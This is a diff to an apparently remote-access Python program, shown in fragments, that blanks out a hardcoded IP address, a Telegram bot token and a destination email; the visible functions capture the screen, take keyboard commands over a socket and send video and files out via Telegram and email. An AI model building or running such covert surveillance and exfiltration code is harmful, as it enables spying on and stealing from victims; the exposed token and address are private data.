@@ -73,7 +73,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
 # print(ipv4_addresses)
-ip = "192.168.0.12"
+ip = ""
 reconect = False
 
 
@@ -92,7 +92,7 @@ def admin():
 #admin()
 
 
-def wa1ting(ip="192.168.0.12", s=None, it=0):
+def wa1ting(ip="", s=None, it=0):
     del s
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("\n\tTry to connect " + ip)
@@ -743,7 +743,7 @@ def prepare():
             line = "".join("".join(line.split(" ")[-1]).split("\r"))
             data.append(line)
             dAta.append(line)
-    # ip = wait(ip="192.168.0.12", data=data, main_data=dAta)
+    # ip = wait(ip="", data=data, main_data=dAta)
 
 
 global end_dt
@@ -751,7 +751,7 @@ global perm_dt
 perm_dt = 1
 
 
-def waiting(ip="192.168.0.12", s=None):
+def waiting(ip="", s=None):
     global end_dt
     global perm_dt
 
@@ -869,7 +869,7 @@ def kboard(com):
         hotk(com.split("|")[1], com.split("|")[-1])
 
 
-def v1deo(tm, s=None, ip="192.168.0.12"):
+def v1deo(tm, s=None, ip=""):
     import pyautogui
     # screen = pyautogui.screenshot("screenshot.png")
 
@@ -915,7 +915,7 @@ def send_video(path='output.avi'):
     global message
     global bot
     import telebot
-    bot = telebot.TeleBot('5158577409:AAE9OzHkFI-rKICyZTyPgH4yZnRdIEOsH9s')  # token
+    bot = telebot.TeleBot('')  # token
 
     @bot.message_handler(commands=['stp'])
     def stop_command():
@@ -1164,7 +1164,7 @@ def atach_file(msg, filepath):
 
 email = ""
 password = ""
-dest_email = "verart1@yandex.ru"
+dest_email = ""
 
 
 def read_file(python):
